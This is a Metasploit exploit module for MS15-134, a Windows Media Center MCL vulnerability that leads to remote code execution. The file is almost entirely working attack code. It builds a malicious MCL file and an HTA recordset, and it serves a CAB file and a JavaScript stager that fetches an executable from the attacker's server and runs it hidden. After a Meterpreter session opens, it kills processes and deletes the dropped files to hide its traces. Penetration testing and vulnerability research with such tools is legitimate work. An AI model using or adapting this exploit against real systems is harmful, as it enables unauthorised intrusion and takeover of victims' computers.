##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::EXE

  def initialize(info={})
    super(update_info(info,
      'Name'           => "MS15-134 Microsoft Windows Media Center MCL Self-Executing Vulnerability",
      'Description'    => %q{
        This module exploits a vulnerability found in Windows Media Center. It allows an MCL
        file to render itself as an HTML document in the local machine zone by Internet Explorer,
        which can turn into arbitrary code execution.

        If you'd rather be using this vulnerability to steal files, then please use the
        auxiliary/server/ms15_134_mcl_leak module instead.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Zhang YunHai',
          'Eduardo Prado',
          'sinn3r'
        ],
      'References'     =>
        [
          ['CVE', '2015-6127'],
          ['MSB', 'MS15-134'],
          ['EDB', '38911'],
          ['BID', '78512']
        ],
      'DefaultOptions'  =>
        {
          'EXITFUNC' => 'none',
          'DisablePayloadHandler' => 'false',
          # Let's migrate, and then we can safely taskkill some things.
          'InitialAutoRunScript' => 'migrate -f'
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['Windows 7', {}],
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Dec 8 2015",
      'DefaultTarget'  => 0))

    register_options([
      OptString.new('FILENAME',  [ true, 'The MCL file name.', 'msf.mcl'])
    ], self.class)
  end


  #
  # Generates a recordset file that will be saved as an HTA file.
  #
  def generate_recordset_file
    # This way of generating a binary file without any documentation is not recommended.
    #
    # I was unable to find any documentation about this format, so basically I ended up
    # inspecting/binary-comparing a bunch of these files, and figured out this much.
    #
    # There also seems to be no cross-platform Ruby gem that can generate this for
    # me, so I'm out of luck.
    #
    # To learn how this file is generated manually, go to:
    # msf/external/source/exploits/CVE-2015-6127/recordset/
    @recordset_file ||= lambda {
      url = "#{get_uri}/#{@js_fname}"

      top_chunk = %Q|
      01 07 54 47 21 00 00 00 00 02 19 00 B6 92 F2 3F
      04 B2 CF 11 8D 23 00 AA 00 5F FE 58 01 00 00 00
      00 00 00 00 00 03 21 00 D2 AD 63 F6 02 EB CF 11
      B0 E3 00 AA 00 3F 00 0F 00 00 00 01 00 01 00 00
      00 00 00 00 00 FF FF FF FF 10 40 00 02 00 BE 22
      B5 C8 F3 5C CE 11 AD E5 00 AA 00 44 77 3D 03 00
      7F 00 00 00 02 00 00 00 86 00 00 00 02 00 00 00
      49 00 00 00 04 00 00 00 00 00 C1 3C 8E B6 EB 6D
      D0 11 8D F6 00 AA 00 5F FE 58 00 00 06|

      user_data_chunk = %Q|<script src=#{url}></script>|

      data_chunk  = "\x80\x01\x00\x01\x00"
      data_chunk << [user_data_chunk.length].pack('v')
      data_chunk << Rex::Text.to_unicode(user_data_chunk)
      data_chunk << "\x81\x00\xFF\x00\x00\x00\xFF\x00\x00\x00\xFF\x00"
      data_chunk << "\x00\x00\x68\x00\x00\x00\x00\x00\xFF\xFF\x0F"

      data_chunk_size = [data_chunk.length-1].pack('v')

      whole_chunk  = top_chunk.split.map {|b| b.hex.chr}.join
      whole_chunk << data_chunk_size
      whole_chunk << data_chunk

      whole_chunk
    }.call
  end


  #
  # Generates an MCL file that should be used to serve to the target.
  #
  def generate_mcl
    clsid = 'clsid:22222222-2222-2222-2222-222222222222'
    codebase = "#{get_uri}/#{@cab_fname}"

    %Q|
    <application url="#{datastore['FILENAME']}">
    <html>
    <script>
    function getDestFolder() {
      var f = new ActiveXObject("Scripting.FileSystemObject");
      var name = f.GetSpecialFolder(2);
      name += "\\\\";
      return name;
    }

    function getDestFile() {
      var dest = getDestFolder();
      dest += "#{@hta_fname}";
      return dest;
    }

    function downloadCab() {
      var xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
      xmlHttp.Open("GET", "#{get_uri}/#{@cab_fname}", false);
      xmlHttp.send();
      if (xmlHttp.readyState == 4 && xmlHttp.status == 200) {
        saveCab(xmlHttp.ResponseBody);
      }
    }

    function saveCab(data) {
      var dest = getDestFolder();
      dest += "#{@cab_fname}";
      var ado = new ActiveXObject("ADODB.Stream");
      ado.Open();
      ado.Type = 1;
      ado.Write(data);
      ado.SaveToFile(dest, 2);
    }

    function downloadRecordset() {
      var dest = getDestFile();
      try {
        var ado = new ActiveXObject("ADODB.Recordset");
        ado.Open("#{get_uri}/#{@recordset_fname}");
        ado.Save(dest);
        ado.close();
      } catch(e) {
        alert(e.message);
      }
    }

    function runAx() {
      var dest = getDestFolder();
      dest += "#{@cab_fname}";
      var s = "<object classid='#{clsid}' codebase='" + dest + "'></object>";
      document.body.innerHTML += s;
    }
    </script>
    <body onload="downloadCab(); downloadRecordset(); runAx();">
    </body>
    </html>
    </application>
    |
  end


  #
  # JavaScript stager that will download/exe our payload
  #
  def get_js
    %Q|
    function savePayload(dest, data) {
      var ado = new ActiveXObject("ADODB.Stream");
      ado.Open();
      ado.Type = 1;
      ado.Write(data);
      ado.SaveToFile(dest, 2);
    }

    function getTempFolder() {
      var f = new ActiveXObject("Scripting.FileSystemObject");
      var name = f.GetSpecialFolder(2);
      return name;
    }

    function execPayload(path) {
      var shell = new ActiveXObject("WScript.Shell");
      shell.run(path, 0);
    }

    var exeName = getTempFolder() + "\\\\#{@executable_fname}";
    var xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
    xmlHttp.Open("GET", "#{get_uri}/#{@executable_fname}", false);
    xmlHttp.send();
    if (xmlHttp.readyState == 4 && xmlHttp.status == 200) {
      savePayload(exeName, xmlHttp.ResponseBody);
      execPayload(exeName);
    }
    |
  end


  #
  # Serves the JavaScript to the target
  #
  def serve_js(cli)
    js = get_js
    print_status("Serving JavaScript file (#{js.length} bytes)")
    send_response(cli, js, {'Content-Type'=>'text/javascript'})
  end


  #
  # Serves the recordset file (meant to be saved as .hta) to the target
  #
  def serve_recordset(cli)
    recordset = generate_recordset_file
    print_status("Serving recordset file (#{recordset.length} bytes)")
    send_response(cli, recordset, {'Content-Type'=>'text/plain'})
  end


  #
  # Serves our payload EXE
  #
  def serve_exe(cli)
    exe = generate_payload_exe
    print_status("Serving EXE file (#{exe.length} bytes)")
    send_response(cli, exe, {'Content-Type'=>'application/octet-stream'})
  end


  #
  # Serves the cab file
  #
  def serve_cab(cli)
    cab = generate_cab
    print_status("Serving CAB file (#{cab.length}) bytes")
    send_response(cli, cab, {'Content-Type'=>'application/octet-stream'})
  end


  #
  # Handles HTTP requests
  #
  def on_request_uri(cli, req)
    case req.uri
    when /#{@js_fname}/
      serve_js(cli)
    when /#{@recordset_fname}/
      serve_recordset(cli)
    when /#{@executable_fname}/
      serve_exe(cli)
    when /#{@cab_fname}/
      serve_cab(cli)
    else
      print_error("Unknown URI requested: #{req.uri}")
      send_not_found(cli)
    end
  end


  #
  # Generates a cab file that will execute our HTA file.
  # See external/source/exploits/CVE-2015-6127/readme.md for more info.
  #
  def generate_cab
    @cab_file ||= lambda {
      path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2015-6127', 'msf.cab')
      cab_file = ''
      File.open(path, 'rb') { |f| cab_file = f.read }
      cab_file
    }.call
  end


  #
  # Checks important option(s)
  #
  def check_filename
    unless /\.mcl$/i === datastore['FILENAME']
      raise OptionValidateError, ['FILENAME (incorrect extension; must be .mcl)']
    end
  end


  #
  # Setting up other things for the module.
  #
  def setup
    check_filename
    super
  end


  #
  # Terminates unwanted processes as a way to make the exploit less noisy.
  #
  def taskkill(cli, name)
    return unless cli.type == 'meterpreter'
    begin
      cli.sys.process.execute("taskkill /f /im:#{name}")
      print_status("#{name} terminated.")
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error(e.message)
      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
    end
  end


  #
  # It doesn't look like FileDropper can help us here, because we don't know the user-specific
  # %TEMP% folder in advance, so we can't tell it what to delete.
  #
  def rm_file(cli, fname)
    return unless cli.type == 'meterpreter'
    temp = cli.sys.config.getenv("temp")
    begin
      cli.fs.file.rm("#{temp}\\#{fname}")
      print_status("#{fname} removed.")
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error("Unable to remove #{temp}\\#{fname} (#{e.message})")
      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
    end
  end


  #
  # Performs some custom cleanup.
  #
  def on_new_session(cli)
    sleep(1)
    cli.core.use("stdapi") unless cli.ext.aliases.include?("stdapi")
    taskkill(cli, 'mshta.exe')
    taskkill(cli, 'ehshell.exe')
    rm_file(cli, @hta_fname)
    rm_file(cli, @cab_fname)
    rm_file(cli, @executable_fname)
    super
  end


  def start_service
    super

    mcl = generate_mcl
    file_create(mcl)
    print_status("Manually pass #{datastore['FILENAME']} to the target you wish to exploit.")
    print_status("If you wish to change the file name #{datastore['FILENAME']} to something else, make sure")
    print_status("to update the url attribute in the file to have a matching name as well.")
  end


  def exploit
    # Unfortunately, you cannot touch this variable. It has to freeze because the cab file needs
    # to know this file path, and since we cannot generate the cab file on the fly, we cannot
    # automatically update this information.
    @hta_fname        = 'explorer.hta'.freeze

    @cab_fname        = "#{Rex::Text.rand_text_alpha(4)}.cab" # Executes the hta
    @recordset_fname  = 'recordset.txt'                       # This will be the hta file
    @js_fname         = "#{Rex::Text.rand_text_alpha(5)}.js"  # Download/exec the payload
    @executable_fname = "#{Rex::Text.rand_text_alpha(6)}.exe" # Name of the payload

    super
  end

end

=begin

When you get a shell, this is where you are:

meterpreter > pwd
C:\Windows\system32
  
=end

